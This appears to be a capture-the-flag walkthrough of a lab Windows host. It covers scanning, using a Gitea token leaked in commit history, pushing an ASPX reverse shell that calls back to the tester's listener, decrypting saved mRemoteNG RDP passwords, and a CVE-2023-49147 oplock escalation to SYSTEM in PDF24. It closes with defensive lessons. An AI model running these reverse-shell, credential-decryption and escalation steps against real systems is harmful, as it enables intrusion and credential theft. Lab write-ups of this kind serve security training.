---
title: "Lock"
slug: "lock"
toc:
  - id: "reconnaissance"
    label: "Reconnaissance"
  - id: "web-enumeration"
    label: "Web Enumeration"
  - id: "gitea-access-token"
    label: "Gitea Access Token"
  - id: "foothold-via-malicious-aspx"
    label: "Foothold via Malicious ASPX"
  - id: "mremoteng-credentials"
    label: "mRemoteNG Credentials"
  - id: "user-flag"
    label: "User Flag"
  - id: "privilege-escalation"
    label: "Privilege Escalation"
  - id: "root-flag"
    label: "Root Flag"
  - id: "key-takeaways"
    label: "Key Takeaways"
---

## Reconnaissance

I ran a full TCP port scan with service detection.

```
$ nmap -p- --min-rate=3000 --max-retries=3 -T4 -sCV -Pn 10.129.234.64
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-27 22:59 +0000
Nmap scan report for 10.129.234.64
Host is up (0.11s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Lock - Index
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds?
3000/tcp open  http          Golang net/http server
|_http-title: Gitea: Git with a cup of tea
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=5a37c5e34a493ecb; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=Dbjpud6H6MU3KTo9eA4xOAQlxr06MTc5MzE0MjAzNjM2MjY2MTQwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 27 Oct 2026 23:00:36 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|_    <link rel="manifest" href="data:application/json;base64,...
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2026-10-27T23:00:57+00:00
|_ssl-date: 2026-10-27T23:01:17+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=Lock
| Not valid before: 2026-10-26T22:57:19
|_Not valid after:  2027-04-27T22:57:19
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-10-27T23:01:02
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.94 seconds
```

> **Note:** This is a standalone Windows host. There's an IIS site on 80, a self-hosted **Gitea** instance on 3000, SMB on 445 and RDP on 3389.

## Web Enumeration

The port 80 site is just a static corporate brochure page.

[![The Lock company website served by IIS on port 80](/images/walkthroughs/lock/website-home.png)](/images/walkthroughs/lock/website-home.png)

Requests for paths that don't exist hit the default IIS 404 page.

[![The default IIS 404 "File or directory not found" page](/images/walkthroughs/lock/iis-404.png)](/images/walkthroughs/lock/iis-404.png)

whatweb confirmed it's an ASP.NET app on IIS.

```
$ whatweb http://10.129.234.64
http://10.129.234.64 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.234.64], Lightbox, Microsoft-IIS[10.0], Script, Title[Lock - Index], X-Powered-By[ASP.NET]
```

Directory brute-forcing found only the static asset folders.

```
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.129.234.64/FUZZ

<SNIP>

                        [Status: 200, Size: 16054, Words: 3024, Lines: 347, Duration: 1657ms]
assets                  [Status: 301, Size: 152, Words: 9, Lines: 2, Duration: 61ms]
aspnet_client           [Status: 301, Size: 159, Words: 9, Lines: 2, Duration: 62ms]
index.html              [Status: 200, Size: 16054, Words: 3024, Lines: 347, Duration: 38ms]
:: Progress: [4614/4614] :: Job [1/1] :: 1020 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

With the IIS site a dead end, I moved to the Gitea instance on port 3000.

## Gitea Access Token

Gitea allows anonymous browsing, and Explore listed a single public repository owned by ellen.freeman.

[![Gitea Explore showing the ellen.freeman/dev-scripts repository](/images/walkthroughs/lock/gitea-dev-scripts.png)](/images/walkthroughs/lock/gitea-dev-scripts.png)

Digging into the commit history, an "Update repos.py" commit had removed a hardcoded personal access token.

[![Gitea commit diff showing a hardcoded PERSONAL_ACCESS_TOKEN being removed from repos.py](/images/walkthroughs/lock/gitea-token-diff.png)](/images/walkthroughs/lock/gitea-token-diff.png)

> **Note:** Deleting a secret in a later commit doesn't remove it — the old value is still sitting in the repo's history. The commit swapped the literal token for an `os.getenv('GITEA_ACCESS_TOKEN')` lookup, but the original token is right there in the diff.

I downloaded the script from the repo.

```
$ curl http://10.129.234.64:3000/ellen.freeman/dev-scripts/raw/branch/main/repos.py -O -s
```

Then set the leaked token in the environment variable it reads.

```
$ export GITEA_ACCESS_TOKEN='43ce39bb0bd6bc489284f2905f033ca467a6362f'
```

With the token set, the script listed ellen.freeman's repos — including a private `website` one.

```
$ python repos.py http://10.129.234.64:3000
Repositories:
- ellen.freeman/dev-scripts
- ellen.freeman/website
```

## Foothold via Malicious ASPX

I cloned the `website` repo, authenticating as ellen.freeman with the leaked token as the password.

```
$ git clone http://10.129.234.64:3000/ellen.freeman/website
Cloning into 'website'...
Username for 'http://10.129.234.64:3000': ellen.freeman
Password for 'http://ellen.freeman@10.129.234.64:3000':
remote: Enumerating objects: 165, done.
remote: Counting objects: 100% (165/165), done.
remote: Compressing objects: 100% (128/128), done.
remote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0
Receiving objects: 100% (165/165), 7.16 MiB | 1.07 MiB/s, done.
Resolving deltas: 100% (35/35), done.
```

> **Note:** The repo is deployed to the IIS web root on push, so committing an `.aspx` and requesting it gives server-side execution.

I downloaded an ASPX reverse shell into the repo.

```
$ cd website/
$ curl https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/refs/heads/master/shell.aspx -O -s
```

I used sed to set my IP and listener port in the shell.

```
$ sed -i -e 's/127\.0\.0\.1/10.10.14.56/g' -e 's/1234/9001/g' shell.aspx
```

I added the shell to the commit.

```
$ git add shell.aspx
```

Committed the change.

```
$ git commit -m 'revshell'
[main e5d9d47] revshell
 Committer: Pwndalf <pwndalf@kali>
Your name and email address were configured automatically based
on your username and hostname. Please check that they are accurate.
You can suppress this message by setting them explicitly. Run the
following command and follow the instructions in your editor to edit
your configuration file:

    git config --global --edit

After doing this, you may fix the identity used for this commit with:

    git commit --amend --reset-author

 1 file changed, 423 insertions(+)
 create mode 100644 shell.aspx
```

And pushed it up, which deployed it to the live site.

```
$ git push
Username for 'http://10.129.234.64:3000': ellen.freeman
Password for 'http://ellen.freeman@10.129.234.64:3000':
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 8 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 3.76 KiB | 3.76 MiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.129.234.64:3000/ellen.freeman/website
   73cdcc1..e5d9d47  main -> main
```

I started a netcat listener.

```
$ nc -lnvp 9001
listening on [any] 9001 ...
```

Then I sent a request to the reverse shell to trigger it.

```
$ curl http://10.129.234.64/shell.aspx
```

I caught a shell as lock\ellen.freeman and upgraded to PowerShell.

```
connect to [10.10.14.56] from (UNKNOWN) [10.129.234.64] 62982
Spawn Shell...
Microsoft Windows [Version 10.0.20348.3932]
(c) Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
lock\ellen.freeman

c:\windows\system32\inetsrv>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
```

## mRemoteNG Credentials

In ellen.freeman's roaming AppData I spotted an mRemoteNG folder.

```
PS C:\windows\system32\inetsrv> cd c:\users\ellen.freeman
cd c:\users\ellen.freeman
PS C:\users\ellen.freeman> ls appdata\roaming
ls appdata\roaming


    Directory: C:\users\ellen.freeman\appdata\roaming


Mode                 LastWriteTime         Length Name                                                               
----                 -------------         ------ ----                                                               
d-----        12/28/2023   5:58 AM                Adobe                                                              
d---s-        12/28/2023   6:04 AM                Microsoft                                                          
d-----        12/28/2023   5:59 AM                mRemoteNG
```

The folder held confCons.xml alongside a stack of timestamped backups.

```
PS C:\users\ellen.freeman> ls appdata\roaming\mremoteng
ls appdata\roaming\mremoteng


    Directory: C:\users\ellen.freeman\appdata\roaming\mremoteng


Mode                 LastWriteTime         Length Name                                                               
----                 -------------         ------ ----                                                               
d-----        12/28/2023   5:58 AM                Themes                                                             
-a----        12/28/2023   5:59 AM           3341 confCons.xml                                                       
-a----        12/28/2023   5:58 AM            340 confCons.xml.20231228-0558390956.backup                            
-a----        12/28/2023   5:58 AM           3242 confCons.xml.20231228-0558434222.backup                            
-a----        12/28/2023   5:58 AM           3236 confCons.xml.20231228-0558502242.backup                            
-a----        12/28/2023   5:58 AM           3249 confCons.xml.20231228-0558531392.backup                            
-a----        12/28/2023   5:58 AM           3253 confCons.xml.20231228-0558577172.backup                            
-a----        12/28/2023   5:58 AM           3341 confCons.xml.20231228-0559136449.backup                            
-a----        12/28/2023   5:59 AM           3341 confCons.xml.20231228-0559140364.backup                            
-a----        12/28/2023   5:59 AM           3341 confCons.xml.20231228-0559599708.backup                            
-a----        12/28/2023   5:59 AM             51 extApps.xml                                                        
-a----        12/28/2023   5:59 AM           2014 mRemoteNG.log                                                      
-a----        12/28/2023   5:59 AM           2246 pnlLayout.xml
```

confCons.xml stored an RDP profile for Gale.Dekarios with encrypted password.

```
PS C:\users\ellen.freeman> cat appdata\roaming\mremoteng\confcons.xml
cat appdata\roaming\mremoteng\confcons.xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="u5ojv17tIZ1H1ND1W0YqvCslhrNSkAV6HW3l/hTV3X9pN8aLxxSUoc2THyWhrCk18xWnWi+DtnNR5rhTLz59BBxo" ConfVersion="2.6">
    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="LYaCXJSFaVhirQP9NhJQH1ZwDj1zc9+G5EqWIfpVBy5qCeyyO1vVrOCRxJ/LXe6TmDmr6ZTbNr3Br5oMtLCclw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
</mrng:Connections>
```

> **Note:** mRemoteNG encrypts saved passwords reversibly. Without a custom master password it uses a hardcoded key, so the `Password` blob decrypts offline with a public script, no cracking needed.

I copied the config locally and decrypted the password with [mremoteng_decrypt.py](https://github.com/kmahyyg/mremoteng-decrypt).

```
$ python3 mremoteng_decrypt.py -rf confCons.xml
Username: Gale.Dekarios
Hostname: Lock
Password: ty8wnW9qCKDosXo6
```

## User Flag

Those credentials worked over RDP.

```
$ xfreerdp /v:10.129.234.64 /u:gale.dekarios /p:ty8wnW9qCKDosXo6 /dynamic-resolution /sec:nla:off
```

The session dropped me onto Gale.Dekarios's desktop.

[![RDP session on the desktop as lock\gale.dekarios](/images/walkthroughs/lock/rdp-gale.png)](/images/walkthroughs/lock/rdp-gale.png)

The user flag sat on Gale's desktop.

```
PS C:\users\gale.dekarios> cat desktop\user.txt
cat desktop\user.txt
61d6************************f6ce
```

## Privilege Escalation

The box had PDF24 11.15.1 installed, a version affected by CVE-2023-49147.

[![PDF24 Creator About dialog showing version 11.15.1](/images/walkthroughs/lock/pdf24-version.png)](/images/walkthroughs/lock/pdf24-version.png)

> **Note:** CVE-2023-49147 abuses PDF24's MSI repair, which runs `pdf24-PrinterInstall.exe` as SYSTEM and writes `faxPrnInst.log`. Holding an oplock on that file freezes the SYSTEM process with its console open, and a SYSTEM-owned console can be broken out into a shell.

The PDF24 installer MSI was still on disk.

```
PS C:\Users\gale.dekarios> gci -path C:\ -recurse -force -filter *pdf24*.msi -errorAction silentlyContinue
		Directory: C:\_install
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        12/14/2023  10:07 AM      462602240 pdf24-creator-11.15.1-x64.msi
```

I started an MSI repair to respawn the SYSTEM installer process.

```
PS C:\Users\gale.dekarios> msiexec.exe /fa c:\_install\pdf24-creator-11.15.1-x64.msi
```

The repair prompts to close the running PDF24 apps, I kept the default choice and continued.

[![The PDF24 MSI repair prompting to close running applications](/images/walkthroughs/lock/msi-repair-prompt.png)](/images/walkthroughs/lock/msi-repair-prompt.png)

I pulled SetOpLock onto the box to set the oplock.

```
PS C:\Users\gale.dekarios> iwr -uri http://10.10.14.56:8000/SetOpLock.exe -o SetOpLock.exe
```

Locking faxPrnInst.log froze the SYSTEM helper partway through the repair.

```
PS C:\Users\gale.dekarios> .\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
```

Now that the lock is in place, pressing OK lets the repair continue straight into the locked file.

[![The MSI repair stalled while SetOpLock holds the oplock on faxPrnInst.log](/images/walkthroughs/lock/oplock-held.png)](/images/walkthroughs/lock/oplock-held.png)

With the SYSTEM-owned console frozen on screen, I right-clicked its title bar and opened Properties.

[![Right-clicking the SYSTEM-owned pdf24-PrinterInstall.exe console and selecting Properties](/images/walkthroughs/lock/system-console-properties.png)](/images/walkthroughs/lock/system-console-properties.png)

In Properties I clicked the "legacy console mode" help link.

[![The console Properties dialog with the legacy console mode help hyperlink](/images/walkthroughs/lock/legacy-console-link.png)](/images/walkthroughs/lock/legacy-console-link.png)

I opened the link with Firefox, which inherits the SYSTEM token.

[![The open-with prompt from the help link, choosing Firefox](/images/walkthroughs/lock/open-with-firefox.png)](/images/walkthroughs/lock/open-with-firefox.png)

In Firefox's open-file dialog I typed the path to cmd.exe and launched it.

[![Firefox open-file dialog with C:\Windows\System32\cmd.exe in the address bar](/images/walkthroughs/lock/firefox-open-cmd.png)](/images/walkthroughs/lock/firefox-open-cmd.png)

cmd.exe opened running as NT AUTHORITY\SYSTEM.

[![An Administrator cmd.exe running as nt authority\system](/images/walkthroughs/lock/system-shell.png)](/images/walkthroughs/lock/system-shell.png)

## Root Flag

From the SYSTEM shell I read the root flag.

```
C:\Windows\System32>type c:\users\administrator\desktop\root.txt
c515************************e92b
```

## Key Takeaways

**Deleted secrets stay in git history.** The Gitea repo's current `repos.py` read its token from an environment variable, but an earlier commit still held the hardcoded personal access token — and that token was enough to reach a private deployment repo. Rotate any credential that has ever been committed, and scan history (not just the working tree) for secrets.

**A deploy-on-push repo is remote code execution.** Write access to the `website` repo published files straight to the IIS web root, so committing an `.aspx` gave a server-side shell. Keep source control separate from the live web root, and deploy with a least-privilege pipeline rather than serving a repo directly.

**mRemoteNG passwords decrypt offline.** The saved RDP connection stored Gale's password in a reversibly encrypted blob that falls back to a hardcoded key, so reading confCons.xml was as good as reading the password. Protect connection files with a strong custom password, or keep credentials in a real secrets manager.

**Unpatched desktop software escalates.** PDF24 11.15.1 (CVE-2023-49147) let a standard user trigger an MSI repair whose SYSTEM helper I paused with an oplock race to reach a SYSTEM-owned console. Keep third-party apps patched and restrict who can repair or reinstall MSIs.

**SYSTEM processes shouldn't be interactive on the desktop.** The break-out worked purely through GUI elements — a console Properties dialog, a help hyperlink, a browser open-file dialog — each inheriting the SYSTEM token. Installers that run as SYSTEM should never expose an interactive window to a logged-on user.
